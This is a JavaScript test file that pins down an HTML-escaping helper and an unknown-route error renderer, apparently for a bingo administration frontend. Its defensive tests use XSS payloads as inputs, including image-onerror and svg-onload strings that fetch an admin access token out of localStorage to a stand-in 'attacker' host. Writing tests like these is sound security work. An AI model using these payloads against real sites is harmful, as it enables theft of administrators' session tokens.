/**
 * Bølge 2B FE-P0-002: shared escapeHtml utility.
 *
 * These tests pin down the contract for the single-source-of-truth
 * `escapeHtml` helper that replaces 48 duplicate per-file implementations.
 * Any change in semantics (e.g. dropping null-safety, changing entity
 * names) breaks the migration assumptions of every page.
 */

import { describe, expect, it } from "vitest";
import { escapeHtml, renderUnknownRoute } from "../escapeHtml.js";

describe("escapeHtml — core HTML entities (FE-P0-002)", () => {
  it("escapes ampersand (must run before angle brackets)", () => {
    expect(escapeHtml("&")).toBe("&amp;");
    expect(escapeHtml("AT&T")).toBe("AT&amp;T");
  });

  it("escapes less-than and greater-than", () => {
    expect(escapeHtml("<")).toBe("&lt;");
    expect(escapeHtml(">")).toBe("&gt;");
    expect(escapeHtml("a < b > c")).toBe("a &lt; b &gt; c");
  });

  it("escapes double quote", () => {
    expect(escapeHtml('"hello"')).toBe("&quot;hello&quot;");
  });

  it("escapes single quote with numeric entity", () => {
    expect(escapeHtml("It's")).toBe("It&#39;s");
  });

  it("escapes all five entities together", () => {
    expect(escapeHtml(`<a href="x" title='y'>&</a>`)).toBe(
      "&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;",
    );
  });
});

describe("escapeHtml — XSS attack vectors (FIN-P1-01)", () => {
  it("neutralises script-tag injection", () => {
    const evil = `<script>alert(document.cookie)</script>`;
    const escaped = escapeHtml(evil);
    expect(escaped).toBe("&lt;script&gt;alert(document.cookie)&lt;/script&gt;");
    // Critical invariant: no raw < or > characters survive.
    expect(escaped).not.toContain("<");
    expect(escaped).not.toContain(">");
  });

  it("neutralises image-onerror injection (player-displayName attack)", () => {
    const evil = `<img src=x onerror=fetch('//attacker?'+localStorage.adminAccessToken)>`;
    const escaped = escapeHtml(evil);
    // Critical invariant: no raw `<img` tag survives — `onerror=` only fires
    // when the browser parses the string as HTML (i.e. as a real <img>
    // element). With angle brackets escaped, the whole string is text-only.
    expect(escaped).not.toContain("<img");
    expect(escaped).toContain("&lt;img");
    // Single quotes also escaped so attribute-breakout is impossible.
    expect(escaped).not.toContain("'");
    expect(escaped).toContain("&#39;");
  });

  it("neutralises svg-onload injection (URL-hash attack)", () => {
    const evil = `<svg/onload=alert(1)>`;
    const escaped = escapeHtml(evil);
    // Critical invariant: no raw `<svg` tag survives. `onload=` is harmless
    // text once the surrounding tag-bracket is HTML-encoded.
    expect(escaped).not.toContain("<svg");
    expect(escaped).toContain("&lt;svg");
    expect(escaped).not.toContain(">");
    expect(escaped).toContain("&gt;");
  });

  it("neutralises attribute-breakout via double-quote", () => {
    // Attacker-controlled value injected into `<a href="${value}">` —
    // a raw `" onclick=...` would break out of the href attribute.
    const evil = `" onclick="alert(1)`;
    const escaped = escapeHtml(evil);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&quot;");
  });

  it("neutralises attribute-breakout via single-quote", () => {
    const evil = `' onclick='alert(1)`;
    const escaped = escapeHtml(evil);
    expect(escaped).not.toContain("'");
    expect(escaped).toContain("&#39;");
  });
});

describe("escapeHtml — null/undefined/coercion safety", () => {
  it("returns empty string for null", () => {
    expect(escapeHtml(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(escapeHtml(undefined)).toBe("");
  });

  it("returns empty string for empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  it("preserves whitespace verbatim (no trimming)", () => {
    expect(escapeHtml("   ")).toBe("   ");
    expect(escapeHtml("a b")).toBe("a b");
    expect(escapeHtml("\n\t")).toBe("\n\t");
  });

  it("coerces numbers via String(...)", () => {
    expect(escapeHtml(42)).toBe("42");
    expect(escapeHtml(3.14)).toBe("3.14");
    expect(escapeHtml(0)).toBe("0");
  });

  it("coerces booleans via String(...)", () => {
    expect(escapeHtml(true)).toBe("true");
    expect(escapeHtml(false)).toBe("false");
  });

  it("coerces objects via String(...) — defensive, not crash", () => {
    // Defensive: should not throw even on unexpected input. The output
    // ([object Object]) is intentionally noisy so the bug is visible.
    expect(escapeHtml({})).toBe("[object Object]");
  });
});

describe("escapeHtml — does NOT mangle valid input", () => {
  it("preserves plain ASCII unchanged", () => {
    expect(escapeHtml("Hello, World")).toBe("Hello, World");
    expect(escapeHtml("Spillorama Bingo")).toBe("Spillorama Bingo");
  });

  it("preserves Norwegian special characters (UTF-8 passthrough)", () => {
    expect(escapeHtml("Bingovert æøå ÆØÅ")).toBe("Bingovert æøå ÆØÅ");
    expect(escapeHtml("Spillvett — pengespillforskriften §66")).toBe(
      "Spillvett — pengespillforskriften §66",
    );
  });

  it("preserves digits, dots, dashes, slashes used in IDs and dates", () => {
    expect(escapeHtml("HALL-101")).toBe("HALL-101");
    expect(escapeHtml("2026-04-29 18:00")).toBe("2026-04-29 18:00");
    expect(escapeHtml("12.345,67 kr")).toBe("12.345,67 kr");
  });

  it("preserves emoji and other supplementary-plane characters", () => {
    expect(escapeHtml("OK ✓")).toBe("OK ✓");
    expect(escapeHtml("⚠️ Pause")).toBe("⚠️ Pause");
  });

  it("does not double-escape an already-escaped string (idempotent only on safe parts)", () => {
    // If a caller accidentally passes already-escaped HTML, the `&` will be
    // re-escaped — this is the correct behaviour. Don't escape twice.
    expect(escapeHtml("&amp;")).toBe("&amp;amp;");
  });
});

describe("renderUnknownRoute (FIN-P1-01 reflected XSS fix)", () => {
  it("escapes path containing <script>", () => {
    const html = renderUnknownRoute("security", "<script>alert(1)</script>");
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes path containing svg-onload", () => {
    const html = renderUnknownRoute(
      "players",
      "/foo/<svg/onload=fetch('//attacker/'+localStorage.adminAccessToken)>",
    );
    // Critical invariant: no raw `<svg` tag and no raw `'` survive in the
    // attacker-controlled portion. The literal text "onload=" remains as
    // harmless text content (it only fires when the browser parses a real
    // <svg> element, which requires raw `<` to construct).
    expect(html).not.toContain("<svg");
    expect(html).toContain("&lt;svg");
    expect(html).toContain("&#39;"); // single quotes from the payload
    // The `>` from the original payload's `<svg/...>` must be escaped.
    // The closing tags `</div>` are part of the wrapper template and are OK.
    const attackerSegment = html.split("Unknown players route: ")[1] ?? "";
    expect(attackerSegment).toContain("&gt;");
    // The first `<` in the attacker segment must NOT exist — the only `<`
    // chars allowed are the closing `</div></div>` from the wrapper.
    const firstClose = attackerSegment.indexOf("</div>");
    const beforeWrapper = attackerSegment.slice(0, firstClose);
    expect(beforeWrapper).not.toContain("<");
  });

  it("escapes module name as well (defence in depth)", () => {
    // Module-name is hard-coded in production callers but defence-in-depth
    // still escapes it.
    const html = renderUnknownRoute("<x>", "/p");
    expect(html).toContain("&lt;x&gt;");
  });

  it("includes the standard error-box DOM structure", () => {
    const html = renderUnknownRoute("security", "/foo");
    expect(html).toContain("box box-danger");
    expect(html).toContain("box-body");
    expect(html).toContain("Unknown security route: /foo");
  });

  it("safely handles empty path", () => {
    const html = renderUnknownRoute("security", "");
    expect(html).toContain("Unknown security route: ");
    expect(html).not.toContain("undefined");
  });
});
